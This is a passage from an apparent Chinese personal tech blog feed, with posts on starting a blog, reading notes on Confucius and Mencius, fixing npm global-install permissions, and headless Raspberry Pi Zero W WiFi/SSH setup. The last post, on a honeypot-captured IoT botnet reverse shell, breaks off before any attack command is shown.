011年10月22日</strong>，我写了自己原创的第一篇文章，那个时候自己高二，遇到了自己喜欢女孩子，她的名字和她的人一样很仙，谐音“舞蹈”。像柯景腾和沈佳宜一样，柯景腾成绩差，沈佳宜成绩好。我成绩差，她成绩好。柯景腾坐在前面，沈佳宜坐在后面。我坐在前面，她坐在后面。我现在还记得当时上课特别专心，就怕自己上课做小动作被她看到，她不喜欢。也从天天早上去学校抄作业，变成了每天学习到很晚，第二天最早给她交作业的那个人。果然，那次期中考试，我进步很大，在犹豫要不要给她表白时，受到长辈们无形的影响，要好好学习，学业为重。于是在她生日的时候，我送给她了一份生日礼物。我还记得那个滑稽的画面，她按住嘴上说不，身体老实的我，把自己亲手做的寿司塞到我嘴里，我心里一边骂骂咧咧，一边觉得，嗯，虽然没什么味儿，但是好甜啊！！那份礼物是什么呢？精心挑选的贝壳项链、她喜欢想小说《七夜雪》以及一封信，信里说：<strong>“我喜欢你，我想和你在一起，但是我好矛盾，我选择了好好读书”</strong>。送了她礼物，整个人的心劲儿就卸下来了，她和另一个比我优秀的男生在一起了，看到他们一起放学回家，心里百感交集，便写下了自己的第一篇原创的文章，内容其实在记录自己当时的生活状态和想法，题目叫——《<strong>喜欢某个人，只需一小时；爱上某个人，只要一天；而忘却某些人，得用一生</strong>》，选自《读者》一篇文章的内容。当然啦，文章下面表哥、表姐、舅妈的鼓励，现在依然记录在那里。</p><p><strong>2019年10月21日</strong>，又拍云发放了免费的流量，我正式开始维护自己的网站。<strong>是什么原因让我捡起这个东西呢？</strong>前段时间，看到一篇搭建图床的本站，想到自己写的文章很多的配图需要用公用图床，图床出了问题，自己文章的图片处理起来很麻烦，所以就想着自己搭一个图床。那么哪一家有免费的羊毛可以薅呢？我看中了又拍云，一个月15G的CDN流量和10G空间的免费额度，前提是什么？得有一个自己的网站，然后挂上又拍云里联盟的logo，所以就摸索着用hexo，搭了一个本站，感谢我的同事，提供了强力的技术支持。他的本站：<a href="https://blog.rabit.pw/">兔子什么都知道</a>，他真的是一个什么都知道的人，23333333。希望我们互放友链，能督促双方持续更新本站吧~<strong>所以，因为薅羊毛，我开始了自己的写作之路。</strong></p><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>维持写作，能让你收获（除了又拍云的15G流量和10G空间）什么呢？他确实会让你了解维护一个网站所需的很多东西，比如怎么选择好用的CDN、怎么设置301之类的跳转、怎么申请证书配置HTTPS、怎么向搜索引擎提交我们的本站。但最重要的，是让我们保持写作的习惯，是对自己思路的总结，鲁迅曾经说过：“好记性不如烂笔头，常动笔有助于预防老年痴呆”。当然啦，多年之后作为一种回忆，也是挺好的一种体验。</p><p>我们应该写一些什么内容呢？我一开始和大多数从事IT行业的程序猿小哥哥一样，一开始只是希望自己写一些技术之类的文章，直到我看到了本站<a href="https://betacat.online/">未上线的猫</a>。相比于他分享的一些技术文章，我发现他的年终总结，他记录回乡下被蜈蚣咬的经历显然更有意思。就像故事FM爱哲说的：“每个人的人生都是一部电影”，看把自己的生活分享出来，看看别人的生活，是一件很有意思的事情。</p><p>有多少人，下定决心要维护自己的网站，选择了一个框架，hexo或者别的，精心挑选了一个主题，配置好自己的网站之后，就停留在了《hello world》。所以，我认为<strong>写博客不是写论文，写报告之类，而是一个真正属于自己的空间，在这个空间里面，你可以写任何的东西，可以是你读了一篇好文章，你生活中遇到了一个有意思的事情，你有一个什么天马行空的想象，你想吐槽一件什么事，你玩了一个好玩的什么游戏，任何东西都可以（当然，反动、违法的东西，还是三思，不然送时尚不锈钢手镯一副就亏了）。本站的行文不必那么规范，可以幽默一些，可以口语化一些，甚至是有一些语病，那有什么关系呢？</strong>反正没什么人看~哈哈哈哈！！</p><p>最后，一个网站的死亡，不是没人看，而是不更新，比不更新更可怕的，是本站没办法访问。但愿所有看本站的你，早日升官发财呀！！！用牧宸的话结尾：<strong>“祝所有看到这篇文章的铁子们，又帅又有钱！！”</strong></p>]]></content>
    
    
    <categories>
      
      <category>关于</category>
      
    </categories>
    
    
    <tags>
      
      <tag>关于</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《高高举起，轻轻放下》-读书笔记</title>
    <link href="/posts/11dbcd5f.html"/>
    <url>/posts/11dbcd5f.html</url>
    
    <content type="html"><![CDATA[<p>这篇文章来自《读者 半月刊 2018年冬季卷合订本》，位置<code># 3326</code>。本文讲了孟子和孔子的两个故事：</p><blockquote><p>齐王有一次问孟子，卿应该做什么。孟子说应该指正君王的错误，如果君王不改，这个卿是王室的同宗，就要把君王换掉，如果不是同宗，就自己滚蛋。</p></blockquote><blockquote><p>孔子在鲁国当过官，鲁王对孔子还不错，但孔子一次参加祭祀，祭祀的肉迟迟不到，孔子就说，我不干了！虽然表面上因为肉迟迟不到就不干了，实际山是因为其“以政为德”的理念实现不了，找了个借口离开，不能辜负君王对她的礼遇，宁可自己背上一个脾气倔的title。</p></blockquote><p>文章的两个故事，都将的是做官的变通之道，我对这种话说模棱两可倒是没什么特别的想法，倒是文中提到了几个有意思的点。</p><h1 id="经历了逆境就能见彩虹吗？"><a href="#经历了逆境就能见彩虹吗？" class="headerlink" title="经历了逆境就能见彩虹吗？"></a>经历了逆境就能见彩虹吗？</h1><blockquote><p><strong>孔子</strong>心中的贤者是什么样？“<strong>一箪食，一瓢饮</strong>”。而<strong>孟子</strong>说：“<strong>天将降大任于斯人也，必先苦其心志，劳其筋骨，饿其体肤，空乏其身。</strong>”就是说，你如果真是一个以天下为己任的人，那么你要接受无数种挑战、干扰、迫害、否则你就成就不了大事。</p></blockquote><p>我对孟子的这段话还是有些印象的，上初中还是高中来着，语文课本中的内容，那时候为了6分的默写题，这段话背了很久。不过想想，也就上初中、高中的时候会读一些古文，工作以后心思就再不会放在读书上了。</p><p>上学的时候读书，是不往脑子里读，“<strong>学而不思则罔</strong>”。工作以后不读书，面对不满意的生活，“<strong>思而不学则殆</strong>”。不过想想，上学的时候只有读书一件事，被父母保护的很好，不需要操心什么事，自然不会懂得什么是所谓的大任，什么是所谓的苦。</p><p>我觉得，作者把这两个例子放在一起，并不是很妥当。</p><ul><li>孔子的“一箪食，一瓢饮”讲的是一种心境，一种懂得知足，不追求锦衣玉食的生活状态。现代社会中，人们学习、工作、加班，为的是自己向往的物质生活。而当自己的欲望超过了自己的能力时，自然就产生了焦虑、烦躁的情绪。我记得之前看过一种说法：“社会中中发声的主力群体，永远也只是那前端的百分之二十”，所以所谓知乎人均985、年薪百万也就不难理解了。那么，在这个信息爆炸的时代，看到那些所谓“有钱人”的的生活，能否还能保持淡然的心态，告诉自己一句“<strong>一箪食，一瓢饮</strong>”呢？</li><li>而孟子的这段话，讲的是在逆境中忍辱负重。我认为逆境对人是有好处的，一帆风顺的人是很难成就大事，过于顺利很容易就变得自负。人经历了逆境，心智得到成长，就具备了成功的基础。</li></ul><p>但是，是否真的经历了逆境，就能见到彩虹吗？我觉得未必，有的人在逆境中就倒下了，有的人即使经历了逆境，发现那只是无用功。做了无用功也好，见到彩虹也好，我觉得孔、孟的话，是希望人们能够问心无愧，获取一种内心的平静。当生活不如意的时候告诉自己，保持一种平淡的心态切记浮躁，别人“一箪食，一瓢饮”不也挺好？当经历挫折的时候告诉自己，也许是“天将降大任于斯人也”？</p><p>忽然想到“祸兮福所倚，福兮祸所伏”、“人狂没好事、狗狂挨砖头”以及易经中的“否极泰来”和“亢龙有悔”。宇宙有一个很有意思的规律，那就是平衡。无论是春风得意时或是流年不利时，我们都要切忌心猿意马。坏透了肯定好事就快来了，也许正是黎明前的黑暗？好透了肯定坏事也快来了，也许是午时的太阳？</p><h1 id="天爵？人爵？"><a href="#天爵？人爵？" class="headerlink" title="天爵？人爵？"></a>天爵？人爵？</h1><blockquote><p>孟子说有天爵，有人爵。一个人的品德是上天给他的爵位；人爵就是人给的，过去分为<strong>公、候、伯、子、男。</strong></p><p>孟子强调人尤其是读书人的定力，就是说把你放在一个最倒霉、嘴不适合你成长、最不适合你发挥的地方，你能否经得住？你能否做到第一不发慌，第二不自杀，第三不灰心丧气？</p></blockquote><p>作者在这里举了天爵、人爵例子，但是后面在说读书人需要有定力。我觉得有些牛头不对马嘴，不过天爵、人爵的例子倒是挺有意思。</p><p>说到人爵，过去是公、候、伯、子、男。现在，我们去银行办个什么事，选项也是什么：“党政机关”、“公务员、事业单位”、“技术人员”、“个体”之类，注意排序，似乎和过去没有太大的区别。社会的阶层从来没有发生过变化。所以，在私企打拼的铁子们，当你的丈母娘，看到你不是公务员、国企员工而漏出鄙夷的神情时，也不要埋怨什么。你虽然挣得多，但确实压力大，确实需要操心失业问题，确实需要担心掉头发。社会的阶层就是这样的，古代商人都是不入九流的，现代社会稍微好点。</p><p>至于天爵，孔子的说法也没错。虽然有人觉得上天给的东西是虚的，但“上天给的”才格外珍贵。人的品德，是从小受环境潜移默化形成的，人的品德，在交往的过程中，会不经意的就会展现在所有人面前。那么，你的天爵是“公、候”别人就会尊敬你，你的天爵连“子、男”都不是，别人又会怎么对你呢？</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解决安装全局npm包提示权限错误</title>
    <link href="/posts/b1e6cb6b.html"/>
    <url>/posts/b1e6cb6b.html</url>
    
    <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>最近开始尝试使用hexo写一些博客全没有接触过Node.js，部署使用的netlify，但netlify的命令行工具也用node.js做的，安装的过程中出现了<code>npm WARN checkPermissions Missing write access to /usr/local/lib/node_modules</code>的报错，根据程序猿的直觉，推测可能是权限出了问题，一概使用<code>sudo</code>解决，后来看到Node.js官方不推荐使用<code>sudo</code>这种方式，便有了这篇文章，把折腾的过程记录了下来。</p><h1 id="配置过程"><a href="#配置过程" class="headerlink" title="配置过程"></a>配置过程</h1><ol><li>备份相关重要文件。</li><li>命令行中，创建一个目录，用于一些全局包的安装：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir ~/.npm-global<br></code></pre></td></tr></table></figure><ol start="3"><li>设置npm使用新的目录：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm config set prefix &#x27;~/.npm-glabal&#x27;<br></code></pre></td></tr></table></figure><ol start="4"><li>设置环境变量：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">export PATH=&quot;~/.npm-global/bin:$PATH&quot;<br></code></pre></td></tr></table></figure><blockquote><p>tips: 第四步的命令可以直接在命令行中使用，也可以写到命令行的配置文件中，mac推荐写到<code>~/.bash_profile</code>中，ubnuntu之类的推荐写到<code>~/.bashrc</code>中。之后通过<code>source ~/.bash_profile</code>或<code>source ~/.bashrc</code>生效即可。</p></blockquote><ol start="5"><li>测试新的设置是否生效：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install -g jshint<br></code></pre></td></tr></table></figure><blockquote><p>tips：测试完后，删除测试安装的包可以使用<code>npm uninstall -g jshint</code>。</p></blockquote><p>另外，可以按照如下设置环境变量来替代2-4步中的配置过程：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">NPM_CONFIG_PREFIX=~/.npm-global<br></code></pre></td></tr></table></figure><h1 id="扩展知识"><a href="#扩展知识" class="headerlink" title="扩展知识"></a>扩展知识</h1><p>npx：运行全局命令的替代方法</p><p>如果您使用的是npm5.2及以上的版本，则可以考虑使用npx作为运行全局命令的替代方法，尤其是在偶尔仅仅需要一个命令的情况下。</p><p>npx和npm的区别：</p><ul><li>npm将包安装到本地，不会执行包。</li><li>npx将检查是否存在于<code>$PATH</code>或本地项目二进制文件中，并执行它。另外，npx可以执行本地没有安装的包。</li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>[1]: 解决权限问题的英文原文. <a href="https://docs.npmjs.com/resolving-eacces-permissions-errors-when-installing-packages-globally">https://docs.npmjs.com/resolving-eacces-permissions-errors-when-installing-packages-globally</a></p><p>[2]: npx的说明文档. <a href="https://www.npmjs.com/package/npx">https://www.npmjs.com/package/npx</a></p>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
      <category>npm</category>
      
    </categories>
    
    
    <tags>
      
      <tag>npm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>只有一根电源线？照样玩转树莓派Zero W！</title>
    <link href="/posts/e19723e0.html"/>
    <url>/posts/e19723e0.html</url>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>最近从小伙伴那里低价“买”来了一个树莓派Zero W，但是上手后，如何连接树莓派Zero W就成了问题。我尝试借助搜索引擎解决我的问题，但并没有找到一篇很完整、很完美解决我问题的文章。因此，我决定将自己折腾的过程记录下来。通过这篇文章，您将了解到从格式化SD卡开始，到烧写镜像，最后连接树莓派的全过程。</p><p>我这篇文章的题目叫“只有一根电源线？照样玩转树莓派Zero W！”，这其实明确了我期望的使用场景：</p><ul><li>除了一根电源线，我不希望使用更多的配件了。比如额外的屏幕、键盘等等。插上电，我可以抱着自己的笔记本在房子里面到处走动，不需要担心一条随时会掉的“尾巴”。</li><li>我不希望占用树莓派Zero W的串口。因为树莓派的串口默认是给蓝牙使用的，某些情况下我可能依然需要使用蓝牙。</li><li>我不希望占用树莓派Zero W的USB数据接口，某些情况下我可能需要使用USB转TTL，连接一些传感器、模块。</li></ul><p>面向搜索引擎解决问题的过程中，我搜到了一种解决方案：<a href="https://sspai.com/post/40086">如何优雅地食用树莓派Zero W</a>，但这种方式需要占用树莓派Zero的USB数据接口，因此不满足上述的要求。最终，我决定通过网络，使用SSH连接树莓派。但树莓派Zero W没有网口，所以最终就只能通过WiFi来连接了。</p><p>ps：你可能会发现，“我的树莓派Zero上电之后怎么什么都不亮”，这其实因为树莓派Zero没有电源灯，只有一个读写SD卡的指示灯，所以烧录好镜像以后，就会亮灯了<del>因为这个事我一度怀疑我的小伙伴是奸商</del></p><h1 id="所需材料"><a href="#所需材料" class="headerlink" title="所需材料"></a>所需材料</h1><ul><li>树莓派Zero w</li><li>SD卡和读卡器</li><li>数据线</li><li>没有了</li></ul><img src="https://pic.gaficat.com/maker/IMG20191104201638.jpg" style="zoom: 25%;" /><h1 id="全过程"><a href="#全过程" class="headerlink" title="全过程"></a>全过程</h1><h2 id="1-格式化SD卡"><a href="#1-格式化SD卡" class="headerlink" title="1.格式化SD卡"></a>1.格式化SD卡</h2><p>格式化SD卡，使用树莓派论坛推荐的<a href="https://www.sdcard.org/downloads/formatter/">SD Memory Card Formatter</a>就行了，Windows和Mac平台都能使用（打不开官网的，给出<a href="https://pan.baidu.com/s/1v_Ym613hFGyaUXE0ifNFDQ">百度云</a>链接吧）。打开软件，选择对应的SD卡，点击格式化即可。</p><h2 id="2-烧写镜像"><a href="#2-烧写镜像" class="headerlink" title="2. 烧写镜像"></a>2. 烧写镜像</h2><p>我们可以在树莓派的官网看到两种镜像：<a href="https://www.raspberrypi.org/downloads/noobs/">NOOBS</a>和<a href="https://www.raspberrypi.org/downloads/raspbian/">Raspbian</a>。NOOBS是树莓派官方发布的工具，其实是集成了安装程序、恢复程序和镜像等。NOOBS对初次接触树莓派的人非常友好，下载好NOOBS的镜像，把内容解压到SD卡根目录，给树莓派插上 SD卡、键盘、鼠标、屏幕，上电即可，之后根据提示即可完成系统的安装。由于本次我们不单独给树莓派配备屏幕等配件，所以选择安装<a href="https://www.raspberrypi.org/downloads/raspbian/">Raspbian</a>，<a href="https://www.raspberrypi.org/downloads/raspbian/">Raspbian</a>有<a href="https://pan.baidu.com/s/1IhETg1WfY_jGH4LSBvSFmg">“lite”</a>、“desktop”或者“desktop and recommended software”几个版本。我是程序猿，我想装逼，我不需要图形界面，所以就选择<a href="https://pan.baidu.com/s/1IhETg1WfY_jGH4LSBvSFmg">“lite”</a>了。开玩笑啦，其实，毕竟Zero的性能有限，我不需要使用它的图形界面做一些其他事，只想在上面跑一些python脚本。当然也可以选择“desktop”或者“desktop and recommended software”版本的镜像，安装好之后可以使用VNC连接Zero，不过这不是本篇文章讨论的内容。</p><p>树莓派官方推荐使用开源工具<a href="https://www.balena.io/etcher/">balenaEtcher</a>完成烧写镜像的过程，对于大多数用户而言，这是最简单的选择。使用<a href="https://www.balena.io/etcher/">balenaEtcher</a>烧写镜像的过程如下：</p><ul><li>下载<a href="https://www.balena.io/etcher/">balenaEtcher</a>并安装</li><li>把SD卡插入读卡器</li><li>打开<a href="https://www.balena.io/etcher/">balenaEtcher</a>并从硬盘中选择要写入SD卡的镜像文件（.img或.zip）</li><li>选择要写入镜像的SD卡</li><li>最后写入镜像即可</li></ul><p>我在Windows平台测试，没有问题的，但是在Mac Mojave和Mac Catalina，该开源工具似乎并无法正常使用，不知道是不是我的打开姿势不对，所以无奈，Mac上只能使用命令行进行整个烧录过程。还是强烈建议各位使用<a href="https://www.balena.io/etcher/">balenaEtcher</a>在Windows完成镜像的烧写过程，使用命令行烧写镜像，一旦选择错硬盘，将直接覆盖磁盘内的数据，三思而后行。</p><h3 id="2-1-查找SD卡"><a href="#2-1-查找SD卡" class="headerlink" title="2.1 查找SD卡"></a>2.1 查找SD卡</h3><p>格式化SD卡之后，首先使用<code>diskutil list</code>查找SD卡的磁盘，我们可以从<strong>磁盘的描述、容量信息以及名称（注意/dev/disk2后面括号内的<code>(external，physical)标识</code>）</strong>，看出我们SD卡对应的磁盘，这里，我的SD卡为：<code>/dev/disk2</code>，如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">scarleastdeMacBook-Pro:~ scarleast$ diskutil list<br>/dev/disk0 (internal, physical):<br><span class="hljs-meta">   #</span><span class="bash">:                       TYPE NAME                    SIZE       IDENTIFIER</span><br>   0:      GUID_partition_scheme                        *500.3 GB   disk0<br>   1:                        EFI EFI                     314.6 MB   disk0s1<br>   2:                 Apple_APFS Container disk1         500.0 GB   disk0s2<br><br>/dev/disk1 (synthesized):<br><span class="hljs-meta">   #</span><span class="bash">:                       TYPE NAME                    SIZE       IDENTIFIER</span><br>   0:      APFS Container Scheme -                      +500.0 GB   disk1<br>                                 Physical Store disk0s2<br>   1:                APFS Volume Macintosh HD - 数据     107.9 GB   disk1s1<br>   2:                APFS Volume Preboot                 82.4 MB    disk1s2<br>   3:                APFS Volume Recovery                528.9 MB   disk1s3<br>   4:                APFS Volume VM                      3.2 GB     disk1s4<br>   5:                APFS Volume Macintosh HD            10.6 GB    disk1s5<br><br>/dev/disk2 (external, physical):<br><span class="hljs-meta">   #</span><span class="bash">:                       TYPE NAME                    SIZE       IDENTIFIER</span><br>   0:     FDisk_partition_scheme                        *15.9 GB    disk2<br>   1:             Windows_FAT_32 BOOT                    15.9 GB    disk2s1<br></code></pre></td></tr></table></figure><h3 id="2-2-为烧写镜像做准备"><a href="#2-2-为烧写镜像做准备" class="headerlink" title="2.2 为烧写镜像做准备"></a>2.2 为烧写镜像做准备</h3><p>确定了SD卡的磁盘后，需要卸载SD卡，为烧写镜像做准备，使用<code>diskutil unmountDisk /dev/disk&lt;disk# from diskutil&gt;</code>即可，这里注意，需要自行替换<code>/dev/disk&lt;disk# from diskutil&gt;</code>为SD卡实际的设备名，如下所示（我的为<code>/dev/disk2</code>）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">scarleastdeMacBook-Pro:~ scarleast$ diskutil unmountDisk /dev/disk2<br>Unmount of all volumes on disk2 was successful<br></code></pre></td></tr></table></figure><h3 id="2-3-烧写镜像"><a href="#2-3-烧写镜像" class="headerlink" title="2.3  烧写镜像"></a>2.3  烧写镜像</h3><p>使用<code>sudo dd bs=1m if=image.img of=/dev/rdisk&lt;disk# from diskutil&gt; conv=sync</code>，即可将镜像烧录到SD卡中，几个参数的含义：</p><ul><li>if：树莓派镜像的路径</li><li>of：SD卡的路径，<strong>务必确定这里填写的是SD卡的路径，否则有可能直接覆盖相应磁盘上的所有文件</strong></li></ul><p>执行命令后，需要输入root密码，之后等待即可，期间希望查看进度，可以按<code>Ctrl + T</code>查看，过程如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">scarleastdeMacBook-Pro:~ scarleast$ sudo dd bs=1m if=~/Desktop/2019-09-26-raspbian-buster-lite.img  of=/dev/rdisk2  conv=sync<br>load: 1.98  cmd: dd 6571 uninterruptible 0.00u 0.05s<br>48+0 records in<br>47+0 records out<br>49283072 bytes transferred in 2.859712 secs (17233578 bytes/sec)<br>load: 1.98  cmd: dd 6571 uninterruptible 0.00u 0.07s<br>73+0 records in<br>72+0 records out<br>75497472 bytes transferred in 4.517975 secs (16710467 bytes/sec)<br>load: 1.98  cmd: dd 6571 uninterruptible 0.01u 0.08s<br>85+0 records in<br>84+0 records out<br>88080384 bytes transferred in 5.720841 secs (15396405 bytes/sec)<br>load: 1.98  cmd: dd 6571 uninterruptible 0.01u 0.10s<br>98+0 records in<br>97+0 records out<br>101711872 bytes transferred in 6.617933 secs (15369130 bytes/sec)<br>2144+0 records in<br>2144+0 records out<br>2248146944 bytes transferred in 165.306870 secs (13599840 bytes/sec)<br></code></pre></td></tr></table></figure><p>烧写完成之后，SD卡会自动挂载到<code>/Volume/&lt;volume_label&gt;</code>路径下，可以直接查看SD卡中的内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"> ls /Volumes/boot/<br>COPYING.linuxbcm2710-rpi-3-b.dtbfixup4x.datstart.elf<br>LICENCE.broadcombcm2710-rpi-cm3.dtbfixup_cd.datstart4.elf<br>bcm2708-rpi-b-plus.dtbbcm2711-rpi-4-b.dtbfixup_db.datstart4cd.elf<br>bcm2708-rpi-b.dtbbootcode.binfixup_x.datstart4db.elf<br>bcm2708-rpi-cm.dtbcmdline.txtissue.txtstart4x.elf<br>bcm2708-rpi-Zero-w.dtbconfig.txtkernel.imgstart_cd.elf<br>bcm2708-rpi-Zero.dtbfixup.datkernel7.imgstart_db.elf<br>bcm2709-rpi-2-b.dtbfixup4.datkernel7l.imgstart_x.elf<br>bcm2710-rpi-2-b.dtbfixup4cd.datkernel8.img<br>bcm2710-rpi-3-b-plus.dtbfixup4db.datoverlays<br></code></pre></td></tr></table></figure><h2 id="3-设置wifi连接-重点"><a href="#3-设置wifi连接-重点" class="headerlink" title="3. 设置wifi连接-重点"></a>3. 设置wifi连接-重点</h2><p>这一步是整个过程的重点，这一能让树莓派上电之后自动连接WiFi，连接了WiFi我们就可以通过SSH登录树莓派，进行一些操作了。</p><h3 id="3-1-新建WiFi配置文件"><a href="#3-1-新建WiFi配置文件" class="headerlink" title="3.1 新建WiFi配置文件"></a>3.1 新建WiFi配置文件</h3><p>用读卡器连接电脑，在SD卡根目录下，新建一个名称为<code>wpa_supplicant.conf</code>的文件，内容如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev<br>update_config=1<br><br>network=&#123;<br>ssid=&quot;Test_WiFi_2.4G&quot;<br>psk=&quot;HmBePxIi.3&quot;<br>key_mgmt=WPA-PSK<br>&#125;<br></code></pre></td></tr></table></figure><p>我们<strong>只需要关注和修改network中的内容</strong>即可：</p><ul><li>ssid：WiFi的名称</li><li>psk：WiFi的密码</li><li>key_mgmt：加密方式，以实际情况填写，家用目前通常为<code>WPA/WPA2</code>，我这里填写<code>WPA-PSK</code>即可。</li></ul><h3 id="3-2-为树莓派开启ssh"><a href="#3-2-为树莓派开启ssh" class="headerlink" title="3.2 为树莓派开启ssh"></a>3.2 为树莓派开启ssh</h3><p>在SD卡根目录新建一个名称为<code>ssh</code>的空文件，可以使用touch命令，<code>touch ssh</code>。</p><h2 id="4-上电"><a href="#4-上电" class="headerlink" title="4. 上电"></a>4. 上电</h2><p>将SD卡安装到树莓派上，通电，等待1-2分钟，若配置没有问题，就可以在路由器的后台页面中，看到树莓派已经连接上WiFi了。</p><img src="https://pic.gaficat.com/maker/树莓派zero连接上WiFi.png" style="zoom:50%;" /><p>此时使用ssh，默认账户名<code>pi</code>，默认密码<code>raspberry</code>，即可连接树莓派：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">scarleastdeMacBook-Pro:~ scarleast$ ssh pi@192.168.0.153<br>The authenticity of host &#x27;192.168.0.153 (192.168.0.153)&#x27; can&#x27;t be established.<br>ECDSA key fingerprint is SHA256:w8A0kgEd0oZDCF08dfoRYy2YYPA+Q+r8SObvsmETL2w.<br>Are you sure you want to continue connecting (yes/no)? yes<br>Warning: Permanently added &#x27;192.168.0.153&#x27; (ECDSA) to the list of known hosts.<br>pi@192.168.0.153&#x27;s password: <br>Linux raspberrypi 4.19.75+ #1270 Tue Sep 24 18:38:54 BST 2019 armv6l<br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br><br>SSH is enabled and the default password for the &#x27;pi&#x27; user has not been changed.<br>This is a security risk - please login as the &#x27;pi&#x27; user and type &#x27;passwd&#x27; to set a new password.<br><br>pi@raspberrypi:~ $ exit<br></code></pre></td></tr></table></figure><p>最后，不要忘了根据命令行提示修改密码~</p><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>其实之前，我一直使用使用的树莓派3b+，配套有屏幕和无线键盘鼠标，镜像也是选择NOOBS直接安装，连接树莓派选择就更多了。本文是在接触到了Zero之后，被逼无奈折腾的结果，有些时候不逼自己一把，怎么知道自己闲时间那么多呢？当然，这种配置WiFi的方式，在其他的树莓派硬件上同样适用。Happy Maker~</p>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
      <category>电子设计</category>
      
      <category>树莓派</category>
      
      <category>树莓派</category>
      
    </categories>
    
    
    <tags>
      
      <tag>树莓派</tag>
      
      <tag>电子设计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>物联网僵尸网络使用nc建立反向shell</title>
    <link href="/posts/f03c6789.html"/>
    <url>/posts/f03c6789.html</url>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>前几天，我的蜜罐捕获到一个攻击，尝试使用nc创建反向shell，原始日志如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br><span class="hljs-attr">&quot;log_type&quot;</span>: <span class="hljs-string">&quot;post&quot;</span>,<br><span class="hljs-attr">&quot;time&quot;</span>: <span class="hljs-string">&quot;Wed Oct 16 19:44:05 2019&quot;</span>,<br><span class="hljs-attr">&quot;timestamp&quot;</span>: <span class="hljs-string">&quot;1571226245.683864&quot;</span>,<br><span class="hljs-attr">&quot;src_ip&quot;</span>: <span 